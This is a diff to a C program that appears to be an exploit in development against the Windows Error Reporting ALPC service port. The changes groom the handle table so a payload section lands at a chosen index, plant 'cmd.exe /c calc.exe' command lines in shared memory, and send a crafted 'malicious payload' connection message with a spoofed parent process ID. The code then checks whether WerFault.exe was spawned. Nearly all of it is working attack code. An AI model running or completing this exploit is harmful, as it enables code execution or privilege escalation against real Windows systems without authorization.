@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <tlhelp32.h>
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib")
@@ -197,6 +198,14 @@ int procA_entry(DWORD pidB) {
     memset(view, 0, 0xF8);
     view->Size = 0xF8;
     view->TargetPid = pidB;
+    BYTE* report = (BYTE*)view + 0x08;
+    memset(report, 0x41, 0xF0);
+    WCHAR* cmdline = (WCHAR*)(report + 0x00);
+    wcscpy(cmdline, L"C:\\Windows\\System32\\cmd.exe /c calc.exe");
+    cmdline = (WCHAR*)(report + 0x40);
+    wcscpy(cmdline, L"C:\\Windows\\System32\\cmd.exe /c calc.exe");
+    cmdline = (WCHAR*)(report + 0x80);
+    wcscpy(cmdline, L"C:\\Windows\\System32\\cmd.exe /c calc.exe");
     UnmapViewOfFile(view);
 
     ipc->HandleValueA = handleValue;
@@ -230,8 +239,10 @@ int procB_entry(DWORD pidA) {
     DWORD target_handle = ipc->HandleValueA;
     printf("[B] Target handle index: 0x%x\n", target_handle);
 
+// Phase 1: Fill handle table with cheap events up to target index
     HANDLE events[4096];
     int count = 0;
+    int overshoot_count = 0;
 
     while (count < 4096) {
         HANDLE h = CreateEventW(NULL, FALSE, FALSE, NULL);
@@ -239,20 +250,30 @@ int procB_entry(DWORD pidA) {
         DWORD hv = (DWORD)(ULONG_PTR)h;
         events[count++] = h;
 
-        if (hv >= target_handle) {
-            if (hv == target_handle) {
-                CloseHandle(h);
-                count--;
-                printf("[B] Freed slot at exact target 0x%x\n", hv);
-                break;
-            }
+        if (hv == target_handle) {
+            // Exact match — free this slot for payload
             CloseHandle(h);
             count--;
-            printf("[B] Overshot to 0x%x, backing off\n", hv);
+            printf("[B] Freed slot at exact target 0x%x\n", hv);
             break;
+        } else if (hv > target_handle) {
+            // Overshot — close and try to fill the gap
+            CloseHandle(h);
+            count--;
+            printf("[B] Overshot to 0x%x (attempt %d), closing\n", hv, overshoot_count + 1);
+            overshoot_count++;
+
+            if (overshoot_count > 20) {
+                printf("[B] Too many overshoots, giving up\n");
+                break;
+            }
+            // Don't break — keep allocating, handle values are usually contiguous
+            // The next allocation might land exactly on target
+            continue;
         }
     }
 
+    // Phase 2: Create payload mapping at target handle index
     HANDLE hPayload = CreateFileMappingW(
         INVALID_HANDLE_VALUE, NULL,
         PAGE_READWRITE, 0, 0xF8, NULL);
@@ -412,35 +433,54 @@ int main(int argc, char *argv[]) {
     TriggerWerReport();
     Sleep(2000);
 
-    // ---- Connect to WER ALPC port ----
-    // Using the EXACT parameters that worked in the test:
-    // mode=0, NULL ObjectAttributes, NULL PortAttributes, NULL RequiredServerSid
+// ---- Connect with malicious payload in connection message ----
     UNICODE_STRING_T portName;
     RtlInitUnicodeString(&portName, L"\\WindowsErrorReportingServicePort");
 
+    // Build connection message with WER payload
     __declspec(align(8)) BYTE connBuf[0x200];
     ZeroMemory(connBuf, sizeof(connBuf));
 
     PORT_MESSAGE_T* connMsg = (PORT_MESSAGE_T*)connBuf;
-    connMsg->u1.s1.TotalLength = 0x28;
-    connMsg->u1.s1.DataLength = 0;
+    connMsg->u1.s1.TotalLength = 0x200;
+    connMsg->u1.s1.DataLength = 0x200 - 0x28;
     connMsg->u2.ZeroInit = 0;
 
-    SIZE_T connLen = 0x28;
+    // WER body at offset 0x28
+    DWORD* body = (DWORD*)(connBuf + 0x28);
+    body[0] = 0x00000001;            // Method
+    body[1] = 0x00000000;            // Flags
+    body[2] = g_pidA;                // PidPrimary (spoofed parent)
+    body[3] = 0;                     // Pad1
+    body[4] = GetCurrentThreadId();  // Tid
+
+    // PidSecondary at offset 0x60
+    DWORD* pidSecondary = (DWORD*)(connBuf + 0x60);
+    *pidSecondary = g_pidB;
+
+    // HandleValue at offset 0x64 — points to shared section with command line
+    DWORD* handleValue = (DWORD*)(connBuf + 0x64);
+    *handleValue = handleValueA;
+
+    // HandleArray at offset 0x68
+    ULONGLONG* handleArray = (ULONGLONG*)(connBuf + 0x68);
+    handleArray[0] = handleValueA;
+
+    SIZE_T connLen = 0x200;
 
     HANDLE hPort = NULL;
     NTSTATUS status = NtAlpcConnectPort(
         &hPort,
         &portName,
-        NULL,       // ObjectAttributes — NULL works
-        NULL,       // PortAttributes — NULL works
-        0,          // Flags
-        NULL,       // RequiredServerSid — NULL = no SID restriction
-        connMsg,    // ConnectionMessage
-        &connLen,   // BufferLength
-        NULL,       // OutMessageAttributes
-        NULL,       // InMessageAttributes
-        NULL);      // Timeout
+        NULL,
+        NULL,
+        0,
+        NULL,
+        connMsg,
+        &connLen,
+        NULL,
+        NULL,
+        NULL);
 
     printf("[*] NtAlpcConnectPort: 0x%08X (connLen=%llu)\n",
            (unsigned int)status, (unsigned long long)connLen);
@@ -451,46 +491,35 @@ int main(int argc, char *argv[]) {
     }
     printf("[+] Connected to WER ALPC port: 0x%p\n", hPort);
 
-    // ---- Build malicious message ----
-    WER_ALPC_MSG msg;
-    memset(&msg, 0, sizeof(msg));
+    // ---- Dump connection reply ----
+    printf("[*] Connection reply dump (first 0x80 bytes):\n");
+    for (int i = 0; i < 0x80; i += 16) {
+        printf("    %03x: ", i);
+        for (int j = 0; j < 16 && (i+j) < 0x80; j++) {
+            printf("%02x ", connBuf[i+j]);
+        }
+        printf("\n");
+    }
 
-    msg.Header.u1.s1.TotalLength = WER_MSG_TOTAL_SIZE;
-    msg.Header.u1.s1.DataLength = WER_MSG_BODY_SIZE;
-    msg.Header.u2.ZeroInit = 0;
+    DWORD* replyBody = (DWORD*)(connBuf + 0x28);
+    printf("[*] Reply body: StatusOut=0x%08x ResultOut=0x%08x\n",
+           replyBody[0], replyBody[1]);
 
-    msg.Method = 0x20000000;
-    msg.PidPrimary = g_pidA;
-    msg.PidSecondary = g_pidB;
-    msg.HandleValue = handleValueA;
-    msg.HandleArray[0] = handleValueA;
-
-    printf("[*] Sending ALPC message...\n");
-    printf("    Method: 0x%08x\n", msg.Method);
-    printf("    PidPrimary: %d\n", msg.PidPrimary);
-    printf("    PidSecondary: %d\n", msg.PidSecondary);
-    printf("    HandleValue: 0x%x\n", msg.HandleValue);
-
-    WER_ALPC_MSG reply;
-    memset(&reply, 0, sizeof(reply));
-    ULONG replyLen = sizeof(reply);
-
-    status = NtAlpcSendWaitReceivePort(
-        hPort,
-        0,
-        (PORT_MESSAGE_T*)&msg,
-        NULL,
-        (PORT_MESSAGE_T*)&reply,
-        &replyLen,
-        NULL,
-        NULL);
-
-    if (status < 0) {
-        printf("[-] Send failed: 0x%08x\n", (unsigned int)status);
-    } else {
-        printf("[+] Reply received!\n");
-        printf("    StatusOut: 0x%08x\n", reply.StatusOut);
-        printf("    ResultOut: 0x%08x\n", reply.ResultOut);
+    // Check if WerFault was spawned
+    Sleep(2000);
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                if (_wcsicmp(pe.szExeFile, L"WerFault.exe") == 0) {
+                    printf("[+] WerFault.exe spawned! PID=%d Parent=%d\n",
+                           pe.th32ProcessID, pe.th32ParentProcessID);
+                }
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
     }
 
     CloseHandle(hPort);
